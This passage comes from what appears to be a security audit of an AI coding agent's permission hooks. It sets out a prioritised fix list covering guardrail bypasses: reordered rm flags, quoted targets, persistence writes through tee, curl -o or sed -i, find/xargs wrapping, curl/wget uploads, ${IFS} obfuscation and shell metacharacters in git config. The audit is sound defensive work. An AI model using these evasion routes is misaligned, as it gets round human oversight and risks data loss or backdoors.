- `sudo`/`ssh`/`scp`/`git push→main`/`reset --hard`/`clean -f` = `ask` by design
  (Tier-2 two-pass, `:561/:593/:618-626`). Documented human-in-the-loop, not a
  downgrade bug.
- "duplicate deny reasons" impossible — `deny()` calls `process.exit(0)` after the
  first match (`check-sensitive-files.js:46`).
- inline `INJECTION_PATTERNS` overlapping `scan.scanInjection` is redundant, not
  wrong (both run; first hit wins). Optional cleanup, not security.

---

## Fix priority

1. **A4 + A5 + A8 + B1** — one shared **sensitive/persistence-write + destructive-rm
   normalizer**: parse `rm` flags order-independently, strip quotes from targets,
   and apply a single write-target check to redirection/`tee`/`cp`/`mv`/`curl -o`/
   `wget -O`/`sed -i`/`install`. Biggest real-world exposure (system wipe + backdoor
   persistence), one coherent change.
2. **A1 + A2** — make the approve pass recurse into `find`/`xargs` like the deny
   pass; narrow the `python` approve and content-scan interpreted scripts.
3. **A3** — scan shell-redirect/heredoc write content through `scan.scanInjection`.
4. **A6** — `ask` on any curl/wget upload to a remote host.
5. **A7** — de-obfuscation normalization (`${IFS}`, empty quotes) before deny.
6. **A9** — add `MultiEdit|NotebookEdit` to the file-hook matcher.
7. **B3 / C1 / D1 / D2 / D5** — openssl read deny; hard-deny git-config values with
   shell metacharacters; user-level-only script trust; install node check; README fix.

Every fix needs a regression test in `test-hooks.js`: assert the payload now
denies/asks **and** its benign twin still approves (the existing suite is the right
place — it already pairs deny/allow cases).
